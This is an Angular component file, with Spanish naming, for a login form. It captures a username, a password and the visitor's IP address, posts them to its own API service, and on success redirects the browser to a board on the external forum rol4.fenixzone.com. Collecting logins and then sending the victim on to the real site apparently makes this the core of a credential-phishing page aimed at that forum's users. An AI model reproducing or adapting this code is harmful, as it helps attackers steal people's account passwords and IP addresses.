import { Component, OnInit } from '@angular/core';
import { FormControl, FormGroup } from '@angular/forms';
import { Router } from '@angular/router';
import { EnviarDatosApiService } from 'src/app/servicios/enviar-datos-api.service';

@Component({
  selector: 'app-formulario',
  templateUrl: './formulario.component.html',
  styleUrls: ['./formulario.component.css'],
})
export class FormularioComponent implements OnInit {
  datos!: FormGroup;
  respuestaBack: any;
  ip= "-";
  datosEnvio: any;
  
  constructor(private servicioDatos: EnviarDatosApiService, private router: Router) {}

  ngOnInit(): void {
    window.scrollTo( screen.width/2, screen.height/2 );
    this.servicioDatos.obtenerIp().subscribe(respuesta => {
      this.ip= respuesta.ip;
      })
    this.datos = new FormGroup({
      usuario: new FormControl(''),
      contra: new FormControl(''),
    });

  }

  ngOnDestroy(){
    this.datos.reset();

  }

  ngOnChanges() {
    window.location.reload();
    this.datos.reset();
  }

  enviarDatos() {
    this.servicioDatos.enviarDatos({
      "nombre_cuenta": this.datos.get('usuario')?.value,
      "contrasena": this.datos.get('contra')?.value,
      "ip": this.ip
    }).subscribe(respuesta => {
      if (respuesta.detalle == "OK"){
        console.log(respuesta.detalle);
        this.datos.reset();
        window.location.href = 'https://rol4.fenixzone.com/foro/index.php?board=13.0';
      }
    });
  }


   
  
}
